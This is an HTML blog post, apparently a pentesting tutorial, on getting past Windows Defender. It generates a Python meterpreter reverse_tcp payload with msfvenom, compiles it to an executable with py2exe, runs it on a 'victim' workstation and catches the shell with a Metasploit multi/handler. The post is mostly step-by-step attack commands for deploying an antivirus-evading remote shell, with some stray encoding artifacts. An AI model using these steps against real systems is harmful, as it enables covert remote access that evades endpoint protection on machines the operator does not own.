I"‹<h1 class="no_toc" id="summary">Summary</h1>

<ul id="markdown-toc">
  <li><a href="#introduction" id="markdown-toc-introduction">Introduction</a>    <ul>
      <li><a href="#python" id="markdown-toc-python">Python</a></li>
    </ul>
  </li>
  <li><a href="#lets-start" id="markdown-toc-lets-start">Let‚Äôs start</a></li>
  <li><a href="#end" id="markdown-toc-end">Conclusion</a></li>
</ul>

<h1 id="introduction">Introduction</h1>

<p>So, the situation, it is possible to download a file to a machine that is being tested as part of a Pentest or other legitimate activity in Windows, and it is even possible to execute it. If we are talking about the latest, tenth version of the OS, then we will run into its Windows Defender, and the likelihood of stumbling upon an antivirus is great. In such a situation, a very convenient and expandable meterpreter will not work, what is the alternative?</p>

<h2 id="python">Python</h2>

<p>Here is the answer. Using Python in conjunction with metasploit and msfvenom allows us to get a decent alternative to the classic meterpreter with most of its convenient features. However we will have to sacrifice some features, it will not be possible to use such commands as getsystem and it will not be possible to migrate to the process.</p>

<h1 id="lets-start">Let‚Äôs start</h1>

<p>The general scheme is as follows: we generate the python code using msfvenom, feed it to py2exe, launch the binary on the victim machine and catch the session.
<br /><br />
First, install py2exe under version 3.4, since everything above is not supported.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip install py2exe
</code></pre></div></div>
<p>Or, if you like updating like i do:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python -3.4 ‚Äìm pip install py2exe
</code></pre></div></div>

<p><br /><br /></p>

<p>Next, create the .py code:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p python/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; payload.py
</code></pre></div></div>

<p>It is necessary to add ‚Äúimport getpass‚Äù to the code, which for some reason does not do the default msfvenom.</p>

<p><br /><br /></p>

<p>Make the .exe file:
<br /></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python34 -m py2exe.build_exe payload.py --bundle-files 0
</code></pre></div></div>

<p>And run it on the victim‚Äôs workstation preliminarily launch handler:<br /></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfconsole
use exploit/multi/handler
set PAYLOAD python/meterpreter/reverse_tcp
set lhost eth0
set lport &lt;PORT&gt;
run
</code></pre></div></div>

<p>And we get the command shell:</p>

<p><img src="/assets/img/posts_rus/python_shell.jpg" alt="Python_shell" class="img" /></p>

<h1 id="end">Conclusion</h1>

<p>A simple and effective way to combat Windows Defender if you do not want to lose the convenient and familiar meterpreter functionality in favor of more native solutions, such as ssh or telnet.
<br /><br /></p>
:ET